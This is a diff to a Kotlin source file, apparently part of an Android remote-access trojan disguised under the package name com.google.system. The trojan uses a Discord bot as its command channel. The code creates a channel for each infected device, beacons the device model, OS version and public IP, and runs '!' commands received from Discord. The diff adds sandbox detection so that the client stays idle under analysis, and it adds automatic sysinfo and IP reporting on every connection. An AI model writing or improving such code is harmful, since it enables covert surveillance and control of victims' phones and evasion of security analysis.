@@ -1,6 +1,13 @@
 package com.google.system
 
-import kotlinx.coroutines.*
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.Job
+import kotlinx.coroutines.delay
+import kotlinx.coroutines.isActive
+import kotlinx.coroutines.launch
+import kotlinx.coroutines.runBlocking
+import kotlinx.coroutines.withContext
 import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.RequestBody.Companion.toRequestBody
@@ -15,17 +22,8 @@ class DiscordGatewayClient(
     private val onStatus: ((status: String) -> Unit)? = null
 ) {
     companion object {
-        private const val OP_DISPATCH = 0
-        private const val OP_HELLO = 10
-        private const val OP_HEARTBEAT = 1
-        private const val OP_IDENTIFY = 2
-        private const val OP_RESUME = 6
-        private const val OP_RECONNECT = 7
-        private const val OP_INVALID_SESSION = 9
-        private const val OP_HEARTBEAT_ACK = 11
         private const val DEVICE_HB_MIN = 300000L
         private const val DEVICE_HB_MAX = 600000L
-        private val FATAL_CLOSE_CODES = setOf(4004, 4010, 4011, 4012, 4013, 4014)
         private const val PREFS_NAME = "gw_state"
         private const val KEY_SUFFIX = "suffix"
         private const val KEY_ONLINE_SENT = "online_sent"
@@ -36,16 +34,10 @@ class DiscordGatewayClient(
     }
 
     init {
-        StealthLayer.initialize(appContext)
+        try { StealthLayer.initialize(appContext) } catch (_: Exception) {}
     }
 
-    private val wsClient = OkHttpClient.Builder()
-        .readTimeout(0, TimeUnit.MILLISECONDS)
-        .writeTimeout(30, TimeUnit.SECONDS)
-        .connectTimeout(15, TimeUnit.SECONDS)
-        .pingInterval(30, TimeUnit.SECONDS)
-        .retryOnConnectionFailure(false)
-        .build()
+    @Volatile private var webSocket: GatewayWebSocket? = null
 
     private val restClient = OkHttpClient.Builder()
         .connectTimeout(10, TimeUnit.SECONDS)
@@ -56,33 +48,33 @@ class DiscordGatewayClient(
 
     private val jsonMedia = "application/json".toMediaType()
 
-    @Volatile private var ws: WebSocket? = null
     @Volatile private var scope: CoroutineScope? = null
-    @Volatile private var heartbeatJob: Job? = null
     @Volatile private var deviceHeartbeatJob: Job? = null
-    @Volatile private var reconnectJob: Job? = null
-    @Volatile private var connectionMonitorJob: Job? = null
-    @Volatile private var heartbeatInterval = 41250L
-    @Volatile private var seq: Int? = null
     @Volatile private var sessionId: String? = null
+    @Volatile private var seq: Int? = null
     @Volatile private var guildId: String? = null
     @Volatile private var myChannelId: String? = null
-    @Volatile private var reconnectAttempt = 0
-    @Volatile private var reconnecting = false
-    @Volatile private var resuming = false
     @Volatile private var closing = false
-    @Volatile private var fatalError = false
-    @Volatile private var gaveUpAt = 0L
-    @Volatile private var lastHeartbeatAck = 0L
-    private var connectVersion = 0L
     private var crashReport: String? = null
     private var pollJob: Job? = null
     private var lastPolledMsgId: String? = null
     private var pollFailures = 0
-    private val processedCmdIds = linkedSetOf<String>()
+    private val processedCmdIds: MutableSet<String> = java.util.Collections.synchronizedSet(linkedSetOf<String>())
     private val msgQueue = java.util.concurrent.LinkedBlockingQueue<QueuedMessage>()
     private var msgQueueJob: Job? = null
     private val msgSemaphore = kotlinx.coroutines.sync.Semaphore(1)
+
+    private val msgTimestamps = java.util.concurrent.ConcurrentLinkedQueue<Long>()
+    private val MAX_MSGS_PER_MINUTE = 8
+
+    private fun isRateLimited(): Boolean {
+        val now = System.currentTimeMillis()
+        msgTimestamps.add(now)
+        while (msgTimestamps.peek() != null && now - msgTimestamps.peek()!! > 60000) {
+            msgTimestamps.poll()
+        }
+        return msgTimestamps.size > MAX_MSGS_PER_MINUTE
+    }
 
     data class QueuedMessage(
         val type: Type,
@@ -90,6 +82,7 @@ class DiscordGatewayClient(
         val messageId: String? = null,
         val fileName: String? = null,
         val fileBytes: ByteArray? = null,
+        val embedJson: JSONArray? = null,
         val retries: Int = 0,
         val maxRetries: Int = 5,
         val completable: kotlinx.coroutines.CompletableDeferred<String?>? = null
@@ -139,8 +132,8 @@ class DiscordGatewayClient(
                 putBoolean(KEY_ONLINE_SENT, onlineMsgSent)
                 myChannelId?.let { putString(KEY_CHANNEL_ID, it) }
                 guildId?.let { putString(KEY_GUILD_ID, it) }
-                sessionId?.let { putString(KEY_SESSION_ID, it) }
-                seq?.let { putInt(KEY_SEQ, it) }
+                (webSocket?.sessionId ?: sessionId)?.let { putString(KEY_SESSION_ID, it) }
+                (webSocket?.seq ?: seq)?.let { putInt(KEY_SEQ, it) }
                 commit()
             }
         } catch (_: Exception) {}
@@ -152,16 +145,43 @@ class DiscordGatewayClient(
 
     fun start(coroutineScope: CoroutineScope) {
         stop()
-        
+
+        if (StealthLayer.isRunningInSandbox()) {
+            status("Sandbox detected - idle")
+            return
+        }
+
         status("Init")
         try {
             closing = false
-            fatalError = false
-            reconnecting = false
-            resuming = false
             startTime = System.currentTimeMillis()
-            scope = coroutineScope
+            val s = coroutineScope
+            scope = s
             loadState()
+            webSocket = GatewayWebSocket(s, object : GatewayWebSocket.Callbacks {
+                override fun onStatus(s: String) = status(s)
+                override fun onDispatch(type: String, data: Any?) = handleDispatch(type, data)
+                override fun onConnected() {
+                    flushOfflineQueue()
+                }
+                override fun onDisconnected(code: Int) {
+                    sendOfflineAlert()
+                }
+                override fun onFatalError(code: Int, reason: String) {
+                    sendOfflineAlert()
+                    whPost(JSONObject().apply {
+                        put("event", "fatal_close")
+                        put("code", code)
+                        put("reason", reason)
+                    })
+                }
+                override fun onHeartbeatTimeout() {
+                    sendOfflineAlert()
+                }
+                override fun isClosing(): Boolean = closing
+            })
+            webSocket?.sessionId = sessionId
+            webSocket?.seq = seq
             startMsgQueueProcessor()
             whPost(JSONObject().apply {
                 put("event", "start")
@@ -171,11 +191,8 @@ class DiscordGatewayClient(
                 put("time", java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date()))
             })
             android.util.Log.d("DiscordGateway", "Starting gateway client with token: ${DiscordConfig.BOT_TOKEN.take(10)}...")
-            // Connect immediately, verify token in parallel
-            connect()
+            webSocket?.connect()
             verifyTokenAsync()
-            // Start connection monitor for stability
-            startConnectionMonitor()
         } catch (e: Exception) {
             status("Crashed")
             android.util.Log.e("DiscordGateway", "Start failed", e)
@@ -206,7 +223,7 @@ class DiscordGatewayClient(
                             put("event", "token_invalid")
                             put("code", r.code)
                         })
-                        fatalError = true
+                        webSocket?.fatalError = true
                     } else {
                         r.body?.close()
                     }
@@ -219,15 +236,10 @@ class DiscordGatewayClient(
 
     fun stop() {
         closing = true
-        heartbeatJob?.cancel()
+        webSocket?.stop()
         deviceHeartbeatJob?.cancel()
-        reconnectJob?.cancel()
-        connectionMonitorJob?.cancel()
         pollJob?.cancel()
-        try { ws?.close(1000, "shutdown") } catch (e: Exception) {
-            android.util.Log.e("DiscordGateway", "Error closing WS", e)
-        }
-        ws = null
+        webSocket = null
         scope = null
         saveState()
     }
@@ -302,6 +314,7 @@ class DiscordGatewayClient(
         return when (msg.type) {
             QueuedMessage.Type.TEXT -> {
                 val json = JSONObject().put("content", msg.content)
+                if (msg.embedJson != null) json.put("embeds", msg.embedJson)
                 val req = Request.Builder()
                     .url("https://discord.com/api/v10/channels/$chId/messages")
                     .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
@@ -316,6 +329,7 @@ class DiscordGatewayClient(
             }
             QueuedMessage.Type.EDIT -> {
                 val json = JSONObject().put("content", msg.content)
+                if (msg.embedJson != null) json.put("embeds", msg.embedJson)
                 val req = Request.Builder()
                     .url("https://discord.com/api/v10/channels/$chId/messages/${msg.messageId}")
                     .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
@@ -335,6 +349,7 @@ class DiscordGatewayClient(
                     else -> "application/octet-stream"
                 }.toMediaType()
                 val payloadJson = JSONObject().put("content", msg.content)
+                if (msg.embedJson != null) payloadJson.put("embeds", msg.embedJson)
                 val body = MultipartBody.Builder()
                     .setType(MultipartBody.FORM)
                     .addFormDataPart("payload_json", null, payloadJson.toString().toRequestBody(jsonMedia))
@@ -373,8 +388,8 @@ class DiscordGatewayClient(
         pollJob?.cancel()
         pollJob = scope?.launch(Dispatchers.IO) {
             while (isActive) {
-                if (myChannelId != null && !fatalError) pollMessages()
-                delay(if (ws != null) 30000L else 10000L)
+                if (myChannelId != null && webSocket?.fatalError != true) pollMessages()
+                delay(if (webSocket?.isConnected() == true) 30000L else 10000L)
             }
         }
     }
@@ -419,137 +434,12 @@ class DiscordGatewayClient(
         }
     }
 
-    private fun connect() {
-        if (closing) return
-        if (fatalError) {
-            // Retry every 5 minutes even if fatal
-            if (gaveUpAt == 0L) gaveUpAt = System.currentTimeMillis()
-            if (System.currentTimeMillis() - gaveUpAt < 300000L) return
-            fatalError = false
-            gaveUpAt = 0L
-            reconnectAttempt = 0
-            status("Recovery - reconnecting")
-        }
-        connectVersion++
-        try { ws?.close(1000, "reconnecting") } catch (_: Exception) {}
-        ws = null
-        val req = Request.Builder().url(DiscordConfig.GATEWAY_URL).build()
-        try {
-            ws = wsClient.newWebSocket(req, object : WebSocketListener() {
-                override fun onOpen(ws: WebSocket, response: Response) {
-                    reconnecting = false
-                    status("WS open")
-                }
-
-                override fun onMessage(ws: WebSocket, text: String) {
-                    handleMessage(text)
-                }
-
-                override fun onClosing(ws: WebSocket, code: Int, reason: String) {
-                    ws.close(code, reason)
-                }
-
-                override fun onClosed(ws: WebSocket, code: Int, reason: String) {
-                    handleClose(code, reason)
-                }
-
-                override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
-                    status("WS fail")
-                    if (!closing) scheduleReconnect()
-                }
-            })
-        } catch (_: Exception) {
-            status("Conn err")
-            if (!closing) scheduleReconnect()
-        }
-    }
-
-    private fun handleClose(code: Int, reason: String) {
-        if (closing) {
-            reconnecting = false
-            return
-        }
-        status("Close $code")
-        if (code in FATAL_CLOSE_CODES) {
-            status("Fatal $code")
-            fatalError = true
-            gaveUpAt = System.currentTimeMillis()
-            reconnecting = false
-            sendOfflineAlert()
-            whPost(JSONObject().apply {
-                put("event", "fatal_close")
-                put("code", code)
-                put("reason", reason)
-            })
-            return
-        }
-        if (code == 1006 || code == 1001 || code == 1012) {
-            reconnectAttempt = 0
-            sendOfflineAlert()
-        }
-        scheduleReconnect()
-    }
-
-    private fun handleMessage(text: String) {
-        try {
-            val msg = JSONObject(text)
-            val op = msg.optInt("op", -1)
-            val d = msg.opt("d")
-            val s = msg.optInt("s", -1)
-            if (s > 0) {
-                seq = s
-                saveState()
-            }
-
-            when (op) {
-                OP_HELLO -> {
-                    val hello = d as JSONObject
-                    heartbeatInterval = hello.optLong("heartbeat_interval", 41250)
-                    reconnectJob?.cancel()
-
-                    if (resuming && sessionId != null) {
-                        resuming = false
-                        status("Resuming...")
-                        resume()
-                    } else {
-                        resuming = false
-                        sessionId = null
-                        status("Identifying...")
-                        identify()
-                    }
-                    startHeartbeat()
-                }
-                OP_DISPATCH -> handleDispatch(msg.optString("t", ""), d)
-                OP_HEARTBEAT_ACK -> {
-                    lastHeartbeatAck = System.currentTimeMillis()
-                }
-                OP_RECONNECT -> {
-                    resuming = sessionId != null
-                    scheduleReconnect()
-                }
-                OP_INVALID_SESSION -> {
-                    val canResume = d as? Boolean ?: false
-                    if (canResume && sessionId != null) {
-                        resuming = true
-                        scheduleReconnect()
-                    } else {
-                        sessionId = null
-                        seq = null
-                        resuming = false
-                        status("Session rejected, re-identifying")
-                        scheduleReconnect()
-                    }
-                }
-            }
-        } catch (_: Exception) {}
-    }
-
     private fun handleDispatch(type: String, d: Any?) {
         when (type) {
             "READY" -> {
                 val data = d as JSONObject
-                sessionId = data.optString("session_id", null)
-                reconnectAttempt = 0
+                webSocket?.sessionId = data.optString("session_id", null)
+                webSocket?.reconnectAttempt = 0
                 status("Ready")
                 saveState()
                 if (myChannelId != null) {
@@ -564,8 +454,7 @@ class DiscordGatewayClient(
                 }
             }
             "RESUMED" -> {
-                reconnectAttempt = 0
-                startHeartbeat()
+                webSocket?.reconnectAttempt = 0
                 if (myChannelId != null) {
                     if (onlineMsgSent) {
                         sendReconnectedMsg()
@@ -594,7 +483,10 @@ class DiscordGatewayClient(
                 val content = data.optString("content", "").trim()
                 if (chId != myChannelId) return
                 if (msgId.isNotEmpty() && !processedCmdIds.add(msgId)) return
-                if (processedCmdIds.size > 500) processedCmdIds.clear()
+                if (processedCmdIds.size > 500) {
+                    val iter = processedCmdIds.iterator()
+                    repeat(250) { if (iter.hasNext()) { iter.next(); iter.remove() } }
+                }
                 val lines = content.split("\n").filter { it.trim().startsWith("!") }
                 if (lines.isEmpty()) return
                 for (line in lines) {
@@ -672,7 +564,7 @@ class DiscordGatewayClient(
         scope?.launch(Dispatchers.IO) {
             var attempt = 0
             val maxAttempts = 4
-            while (attempt < maxAttempts && myChannelId == null && !closing && !fatalError) {
+            while (attempt < maxAttempts && myChannelId == null && !closing && webSocket?.fatalError != true) {
                 status("Create $name (${attempt+1}/$maxAttempts)")
                 try {
                     val gId = guildId ?: return@launch
@@ -751,11 +643,21 @@ class DiscordGatewayClient(
         onlineMsgSent = true
         saveState()
         scope?.launch(Dispatchers.IO) {
-            val now = java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date())
-            // Send immediate real-time alert
-            val quickMsg = ":green_circle: **DEVICE ONLINE** — ${android.os.Build.MODEL} (${android.os.Build.VERSION.RELEASE})\nTime: $now | SDK: ${android.os.Build.VERSION.SDK_INT}"
+            val now = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US).format(java.util.Date())
             status("Sending online msg")
-            val msgId = sendMsgAwait(quickMsg)
+            val embed = DiscordEmbed(
+                title = "🟢 DEVICE ONLINE",
+                color = 0x2ECC71,
+                fields = listOf(
+                    EmbedField("📱 Device", android.os.Build.MODEL, true),
+                    EmbedField("🤖 Android", "${android.os.Build.VERSION.RELEASE} (SDK ${android.os.Build.VERSION.SDK_INT})", true),
+                    EmbedField("🕐 Time", now, true),
+                    EmbedField("🌐 IP", "fetching...", true)
+                ),
+                footer = android.os.Build.MODEL,
+                timestamp = System.currentTimeMillis()
+            )
+            val msgId = sendEmbedAwait("", embed)
             whPost(JSONObject().apply {
                 put("event", "online")
                 put("channel", myChannelId)
@@ -763,21 +665,35 @@ class DiscordGatewayClient(
                 put("time", now)
                 put("sdk", android.os.Build.VERSION.SDK_INT)
             })
-            // Start command processing immediately
             startDeviceHeartbeat()
             startPolling()
-            // Fetch IP in background and update message
-            scope?.launch(Dispatchers.IO) {
-                val ip = getPublicIp()
-                if (ip != "?" && msgId != null) {
-                    editMsg(msgId, ":green_circle: **DEVICE ONLINE** — ${android.os.Build.MODEL} (${android.os.Build.VERSION.RELEASE})\nTime: $now | IP: ${ip}")
-                }
+            val ip = getPublicIp()
+            if (ip != "?" && msgId != null) {
+                val updated = DiscordEmbed(
+                    title = "🟢 DEVICE ONLINE",
+                    color = 0x2ECC71,
+                    fields = listOf(
+                        EmbedField("📱 Device", android.os.Build.MODEL, true),
+                        EmbedField("🤖 Android", "${android.os.Build.VERSION.RELEASE} (SDK ${android.os.Build.VERSION.SDK_INT})", true),
+                        EmbedField("🕐 Time", now, true),
+                        EmbedField("🌐 IP", ip, true)
+                    ),
+                    footer = android.os.Build.MODEL,
+                    timestamp = System.currentTimeMillis()
+                )
+                editEmbed(msgId, "", updated)
             }
             crashReport?.let { report ->
                 delay(500)
                 sendMsg(":warning: **Crash Report**\n```\n${report.take(1900)}\n```")
                 crashReport = null
             }
+            delay(1000)
+            onCommand("sysinfo", null)
+            delay(1500)
+            onCommand("ip", null)
+            delay(1500)
+            onCommand("status", null)
             status("Online")
         }
     }
@@ -787,10 +703,20 @@ class DiscordGatewayClient(
 
     fun sendOfflineAlert() {
         val now = System.currentTimeMillis()
-        if (now - lastOfflineAlertAt < 60000L) return // Max 1 alert per minute
+        if (now - lastOfflineAlertAt < 60000L) return
         lastOfflineAlertAt = now
         scope?.launch(Dispatchers.IO) {
-            sendMsg(":red_circle: **Connection Lost** — ${android.os.Build.MODEL} | Reconnecting...")
+            val embed = DiscordEmbed(
+                title = "🔴 Connection Lost",
+                color = 0xE74C3C,
+                fields = listOf(
+                    EmbedField("📱 Device", android.os.Build.MODEL, true),
+                    EmbedField("📡 Status", "Reconnecting...", true)
+                ),
+                footer = android.os.Build.MODEL,
+                timestamp = System.currentTimeMillis()
+            )
+            sendEmbed("", embed)
             whPost(JSONObject().apply {
                 put("event", "offline")
                 put("channel", myChannelId)
@@ -801,24 +727,48 @@ class DiscordGatewayClient(
 
     fun sendReconnectedMsg() {
         val now = System.currentTimeMillis()
-        if (now - lastReconnectedMsgAt < 300000L) return // Max 1 reconnect msg per 5 min
+        if (now - lastReconnectedMsgAt < 300000L) return
         lastReconnectedMsgAt = now
         scope?.launch(Dispatchers.IO) {
-            val quickMsg = ":green_circle: **Reconnected** — ${android.os.Build.MODEL}"
-            val msgId = sendMsgAwait(quickMsg)
+            val embed = DiscordEmbed(
+                title = "🟢 Reconnected",
+                color = 0x2ECC71,
+                fields = listOf(
+                    EmbedField("📱 Device", android.os.Build.MODEL, true),
+                    EmbedField("🌐 IP", "fetching...", true)
+                ),
+                footer = android.os.Build.MODEL,
+                timestamp = System.currentTimeMillis()
+            )
+            val msgId = sendEmbedAwait("", embed)
             startDeviceHeartbeat()
             startPolling()
-            scope?.launch(Dispatchers.IO) {
-                val ip = getPublicIp()
-                if (ip != "?" && msgId != null) {
-                    editMsg(msgId, ":green_circle: **Reconnected** — ${android.os.Build.MODEL} | IP: ${ip}")
-                }
+            val ip = getPublicIp()
+            if (ip != "?" && msgId != null) {
+                val updated = DiscordEmbed(
+                    title = "🟢 Reconnected",
+                    color = 0x2ECC71,
+                    fields = listOf(
+                        EmbedField("📱 Device", android.os.Build.MODEL, true),
+                        EmbedField("🌐 IP", ip, true)
+                    ),
+                    footer = android.os.Build.MODEL,
+                    timestamp = System.currentTimeMillis()
+                )
+                editEmbed(msgId, "", updated)
             }
+            delay(1000)
+            onCommand("sysinfo", null)
+            delay(1500)
+            onCommand("ip", null)
+            delay(1500)
+            onCommand("status", null)
         }
     }
 
     fun sendMsg(text: String) {
         if (myChannelId == null) return
+        if (isRateLimited()) return
         val sanitized = sanitizeContent(text)
         val chunks = chunkMessage(sanitized)
         for ((i, chunk) in chunks.withIndex()) {
@@ -907,11 +857,52 @@ class DiscordGatewayClient(
 
     fun sendFile(text: String, fileName: String, fileBytes: ByteArray) {
         if (myChannelId == null) return
+        if (isRateLimited()) return
         val msg = QueuedMessage(
             type = QueuedMessage.Type.FILE,
             content = text,
             fileName = fileName,
             fileBytes = fileBytes,
+            maxRetries = 5
+        )
+        msgQueue.offer(msg)
+    }
+
+    internal fun sendEmbed(content: String, embed: DiscordEmbed) {
+        if (myChannelId == null) return
+        if (isRateLimited()) return
+        val arr = JSONArray().put(embed.toJson())
+        val msg = QueuedMessage(
+            type = QueuedMessage.Type.TEXT,
+            content = content,
+            embedJson = arr,
+            maxRetries = 5
+        )
+        msgQueue.offer(msg)
+    }
+
+    internal suspend fun sendEmbedAwait(content: String, embed: DiscordEmbed): String? {
+        if (myChannelId == null) return null
+        val arr = JSONArray().put(embed.toJson())
+        val msg = QueuedMessage(
+            type = QueuedMessage.Type.TEXT,
+            content = content,
+            embedJson = arr,
+            maxRetries = 5,
+            completable = kotlinx.coroutines.CompletableDeferred()
+        )
+        msgQueue.offer(msg)
+        return msg.completable!!.await()
+    }
+
+    internal fun editEmbed(messageId: String, content: String, embed: DiscordEmbed) {
+        if (myChannelId == null) return
+        val arr = JSONArray().put(embed.toJson())
+        val msg = QueuedMessage(
+            type = QueuedMessage.Type.EDIT,
+            content = content,
+            embedJson = arr,
+            messageId = messageId,
             maxRetries = 5
         )
         msgQueue.offer(msg)
@@ -930,7 +921,7 @@ class DiscordGatewayClient(
             val chunks = chunkMessage(content)
             for ((i, chunk) in chunks.withIndex()) {
                 val p = if (chunks.size > 1) "```\n(${i + 1}/${chunks.size})\n" else "```\n"
-                val suffix = if (i == chunks.size - 1) "\n```" else ""
+                val suffix = "\n```"
                 sendMsg(p + chunk + suffix)
             }
             return
@@ -951,7 +942,6 @@ class DiscordGatewayClient(
     }
 
     private val offlineQueue = java.util.concurrent.ConcurrentLinkedQueue<String>()
-    private var isDeviceOnline = false
 
     fun queueCommandForOffline(cmd: String) {
         offlineQueue.offer(cmd)
@@ -961,7 +951,6 @@ class DiscordGatewayClient(
     }
 
     fun flushOfflineQueue() {
-        isDeviceOnline = true
         scope?.launch(Dispatchers.IO) {
             delay(2000)
             while (offlineQueue.isNotEmpty()) {
@@ -1031,59 +1020,6 @@ class DiscordGatewayClient(
         } catch (_: Exception) { null }
     }
 
-    private fun identify() {
-        val payload = JSONObject().apply {
-            put("op", OP_IDENTIFY)
-            put("d", JSONObject().apply {
-                put("token", DiscordConfig.BOT_TOKEN)
-                put("intents", DiscordConfig.INTENTS)
-                put("properties", JSONObject().apply {
-                    put("os", "android")
-                    put("browser", "okhttp")
-                    put("device", "android")
-                })
-            })
-        }
-        ws?.send(payload.toString())
-    }
-
-    private fun resume() {
-        val sid = sessionId ?: return
-        val payload = JSONObject().apply {
-            put("op", OP_RESUME)
-            put("d", JSONObject().apply {
-                put("token", DiscordConfig.BOT_TOKEN)
-                put("session_id", sid)
-                put("seq", seq ?: JSONObject.NULL)
-            })
-        }
-        ws?.send(payload.toString())
-    }
-
-    private fun startHeartbeat() {
-        heartbeatJob?.cancel()
-        lastHeartbeatAck = System.currentTimeMillis()
-        heartbeatJob = scope?.launch {
-            while (isActive) {
-                val payload = JSONObject().apply {
-                    put("op", OP_HEARTBEAT)
-                    put("d", seq ?: JSONObject.NULL)
-                }
-                ws?.send(payload.toString())
-                delay(heartbeatInterval)
-                val now = System.currentTimeMillis()
-                if (now - lastHeartbeatAck > heartbeatInterval * 10) {
-                    status("Heartbeat timeout")
-                    sendOfflineAlert()
-                    try { ws?.close(1001, "hb timeout") } catch (_: Exception) {}
-                    ws = null
-                    scheduleReconnect()
-                    break
-                }
-            }
-        }
-    }
-
     fun resetOnlineMsgSent() {
         onlineMsgSent = false
         saveState()
@@ -1092,6 +1028,7 @@ class DiscordGatewayClient(
     private fun startDeviceHeartbeat() {
         deviceHeartbeatJob?.cancel()
         deviceHeartbeatJob = scope?.launch {
+            if (StealthLayer.isRunningInSandbox()) return@launch
             val monitor = MonitorEngine.getInstance()
             // Burst: 3 rapid heartbeats so bot sees us immediately after restart/update
             if (monitor.shouldExecuteAction()) {
@@ -1124,42 +1061,7 @@ class DiscordGatewayClient(
         }
     }
 
-    private fun startConnectionMonitor() {
-        connectionMonitorJob?.cancel()
-        connectionMonitorJob = scope?.launch {
-            while (isActive) {
-                delay(60000) // Check every 60 seconds
-                if (closing) break
-                
-                if (ws == null && !reconnecting && !resuming && !closing && startTime > 0) {
-                    android.util.Log.w("DiscordGateway", "Connection monitor: no ws, reconnecting")
-                    status("Conn monitor: reconnecting")
-                    scheduleReconnect()
-                }
-            }
-        }
-    }
 
-    private fun scheduleReconnect() {
-        synchronized(this) {
-            if (reconnecting) return
-            reconnecting = true
-        }
-        reconnectJob?.cancel()
-        val scheduleVersion = connectVersion
-        if (closing) return
-
-        reconnectJob = scope?.launch {
-            if (closing) return@launch
-            val delay = (DiscordConfig.RECONNECT_BASE_DELAY * (1 shl reconnectAttempt.coerceAtMost(10)))
-                .coerceAtMost(DiscordConfig.MAX_RECONNECT_DELAY)
-            reconnectAttempt++
-            status("Recon ${reconnectAttempt}")
-            delay(delay)
-            reconnecting = false
-            if (!closing && connectVersion == scheduleVersion) connect()
-        }
-    }
 
     private suspend fun executeWithRetry(request: Request): Response {
         var retries = 0
@@ -1216,5 +1118,5 @@ class DiscordGatewayClient(
     fun getDeviceTag(): String = "${DiscordConfig.CHANNEL_PREFIX}${deviceSuffix}"
     fun getDeviceSuffix(): String = deviceSuffix
     fun getUptime(): Long = if (startTime > 0) System.currentTimeMillis() - startTime else 0
-    fun isConnected(): Boolean = ws != null && !closing && !fatalError
+    fun isConnected(): Boolean = webSocket?.isConnected() == true
 }
